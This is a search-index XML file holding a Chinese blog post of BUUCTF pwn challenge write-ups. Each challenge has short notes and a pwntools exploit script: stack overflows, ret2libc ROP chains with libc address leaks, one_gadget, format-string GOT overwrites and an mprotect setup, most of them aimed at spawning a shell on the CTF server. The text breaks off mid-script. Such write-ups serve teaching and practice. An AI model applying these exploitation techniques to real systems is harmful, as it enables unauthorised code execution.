<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>buuctf-pwn</title>
      <link href="2021/10/28/buuctf-pwn/"/>
      <url>2021/10/28/buuctf-pwn/</url>
      
        <content type="html"><![CDATA[<blockquote><p>未说明均是使用python3运行</p></blockquote><h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><p>若无法连接，先检查是否写对了远程地址，远程链接中间应为’ ‘空格,而不是’:’冒号。<br>若仍不行，尝试使用root用户<br>仍失败，使用exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc node4.buuoj.cn 28199</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28199</span>)</span><br><span class="line">io.interacve()</span><br></pre></td></tr></table></figure><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>白给栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27412</span>)</span><br><span class="line">system_addr = <span class="number">0x40118A</span></span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;please input&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">15</span>+<span class="number">8</span>) + p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>白给</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27826</span>)</span><br><span class="line">system_addr = <span class="number">0x400611</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">64</span>+<span class="number">8</span>) + p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//小数再内存中的十六进制表示</span></span><br><span class="line">    <span class="keyword">float</span> a = <span class="number">11.28125</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;q is quit&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span>&gt;&gt;a)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span>* p = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)&amp;a;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Ox&quot;</span> &lt;&lt; setfill(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; hex</span><br><span class="line">            &lt;&lt;setw(<span class="number">2</span>) &lt;&lt; (<span class="keyword">int</span>)*(p + <span class="number">3</span>)</span><br><span class="line">            &lt;&lt;setw(<span class="number">2</span>) &lt;&lt; (<span class="keyword">int</span>)*(p + <span class="number">2</span>)</span><br><span class="line">            &lt;&lt;setw(<span class="number">2</span>) &lt;&lt; (<span class="keyword">int</span>)*(p + <span class="number">1</span>)</span><br><span class="line">            &lt;&lt;setw(<span class="number">2</span>) &lt;&lt; (<span class="keyword">int</span>)*p &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://blog.csdn.net/tqydyqt/article/details/104974202</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25645</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Let\&#x27;s guess the number.&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">44</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>由程序可知，输入”I”会变成”you”，在gdb中查看esp与ebp的距离，为60</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28929</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x08048F0D</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(cat_flag_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><p>白给</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25415</span>)</span><br><span class="line">system_addr = <span class="number">0x0000000000400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>首先绕过加密函数，然后泄露puts.got的地址，下面exp中的libc_start_main无需泄露<br>重复泄露的过程，one_gadget打通。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27301</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">main_addr = <span class="number">0x0000000000400B28</span></span><br><span class="line">ret_addr = <span class="number">0x00000000004006b9</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露 puts_addr</span></span><br><span class="line">print(<span class="built_in">hex</span>(<span class="built_in">ord</span>(<span class="string">&#x27;\0&#x27;</span>)))</span><br><span class="line">print(<span class="built_in">hex</span>(<span class="built_in">ord</span>(<span class="string">&#x27;\x00&#x27;</span>)))</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">79</span> + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;Ciphertext\n&#x27;)</span></span><br><span class="line"><span class="comment">#print(io.recvline())</span></span><br><span class="line">print(io.recvline())</span><br><span class="line">print(io.recvline())</span><br><span class="line"><span class="comment">#print(io.recvuntil(b&#x27;\n&#x27;))</span></span><br><span class="line"><span class="comment">#print(io.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(b&#x27;\x00&#x27;, 8))</span></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">print(<span class="string">&quot;puts_addr: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露 libc_start_mainputs_addr</span></span><br><span class="line">print(<span class="built_in">hex</span>(<span class="built_in">ord</span>(<span class="string">&#x27;\0&#x27;</span>)))</span><br><span class="line">print(<span class="built_in">hex</span>(<span class="built_in">ord</span>(<span class="string">&#x27;\x00&#x27;</span>)))</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">79</span> + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(libc_start_main_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;Ciphertext\n&#x27;)</span></span><br><span class="line"><span class="comment">#print(io.recvline())</span></span><br><span class="line">print(io.recvline())</span><br><span class="line">print(io.recvline())</span><br><span class="line"><span class="comment">#print(io.recvuntil(b&#x27;\n&#x27;))</span></span><br><span class="line"><span class="comment">#print(io.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(b&#x27;\x00&#x27;, 8))</span></span><br><span class="line">libc_start_mainputs_addr = u64(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">print(<span class="string">&quot;libc_start_mainputs_addr: &quot;</span> + <span class="built_in">hex</span>(libc_start_mainputs_addr))</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - <span class="number">0x809c0</span></span><br><span class="line">print(<span class="string">&quot;libcbase: &quot;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">print(<span class="string">&quot;libcbase: &quot;</span> + <span class="built_in">hex</span>(libc_start_mainputs_addr - <span class="number">0x21ab0</span>))</span><br><span class="line">system_addr = <span class="number">0x4f440</span></span><br><span class="line">bin_sh_addr = <span class="number">0x1b3e9a</span></span><br><span class="line">onrged = [<span class="number">0x4f322</span>,<span class="number">0x4f2c5</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line"><span class="comment">#payload = b&#x27;\x00&#x27; + b&#x27;a&#x27;*79 + p64(ret_addr) + p64(pop_rdi) + p64(libcbase + bin_sh_addr) + p64(libcbase + system_addr)     #不知道为什么打不通</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">79</span>+<span class="number">8</span>) + p64(libcbase + onrged[<span class="number">0</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><blockquote><p>exp1   直接修改需要对比的内容</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(b&#x27;./fifth_2019_PWN5&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26343</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./fifth_2019_PWN5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x0804A03E</span></span><br><span class="line">system_addr = <span class="number">0x804C020</span></span><br><span class="line">addr = <span class="number">0x0804C044</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;your name:&quot;</span>)</span><br><span class="line">payload = p32(addr) + p32(addr+<span class="number">1</span>) + p32(addr+<span class="number">2</span>) + p32(addr+<span class="number">3</span>) + <span class="string">b&#x27;%10$hhn%11$hhn%12$hhn%13$hhn&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello,&quot;</span>)</span><br><span class="line">io.send(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>exp2   修改aoti_got为system</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(b&#x27;./fifth_2019_PWN5&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26343</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./fifth_2019_PWN5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;your name:&#x27;</span>)</span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello,&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>exp3   使用库函数修改需要对比的内容</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(b&#x27;./fifth_2019_PWN5&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26343</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./fifth_2019_PWN5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;your name:&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;<span class="number">0x0804C044</span> : <span class="number">1</span>&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your passwd:&quot;</span>)</span><br><span class="line">payload = <span class="built_in">str</span>(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><p>首先查看保护措施</p><p><img src="/2021/10/28/buuctf-pwn/4.png"></p><p>查看代码</p><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><p><img src="/2021/10/28/buuctf-pwn/1.png"></p><p>函数sub_80486BB()为初始化缓冲区。 首先读取一个随机数，对随机数进行运算后得到v2，再对v2进行处理。</p><h2 id="sub-804871F"><a href="#sub-804871F" class="headerlink" title="sub_804871F"></a>sub_804871F</h2><p><img src="/2021/10/28/buuctf-pwn/2.png"></p><p>将刚才得到的随机数保存到s中，在读取我们的输入，保存在buf中<br>由于要进行比较，并且strlen遇到\x00会截断，输入\x00即可绕过比较<br>同时我们也可以控制buf[7]的值</p><h2 id="sub-80487D0"><a href="#sub-80487D0" class="headerlink" title="sub_80487D0"></a>sub_80487D0</h2><p><img src="/2021/10/28/buuctf-pwn/3.png"></p><p>这里的a1即是buf[7]，由于200不足以让我们溢出，所以我们要让buf[7]足够大以完成我们接下来的rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(b&#x27;./OGeek2019_babyrop&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28567</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./OGeek2019_babyrop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">b&#x27;OGeek2019_babyrop.so&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_write = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#绕过对比并修改buf[7]的值</span></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露write地址</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span> + <span class="number">4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">&quot;write_addr: &quot;</span>, <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc_write</span><br><span class="line">system_addr = libcbase + libc_system</span><br><span class="line">bin_sh_addr = libcbase + libc_bin_sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#重复第一步</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ret2system</span></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span> + <span class="number">4</span>) + p32(system_addr) + p32(main_addr) + p32(bin_sh_addr)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(b&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28551</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./ciscn_2019_n_8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;\&#x27;s your name?&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span>*<span class="number">4</span> + p32(<span class="number">0x11</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(b&#x27;./jarvisoj_level2&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26882</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./jarvisoj_level2&#x27;</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system_addr) + p32(system_addr) + p32(bin_sh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>又学到了新知识，还是太菜了啊</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br><span class="line">    addr 内存启始地址</span><br><span class="line">    len  修改内存的长度</span><br><span class="line">    prot 内存的权限 <span class="comment">//r+w+x=7</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(b&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25074</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">bss_addr = <span class="number">0x080EC000</span></span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop3_ret = <span class="number">0x080509a5</span></span><br><span class="line"></span><br><span class="line">payload = <span 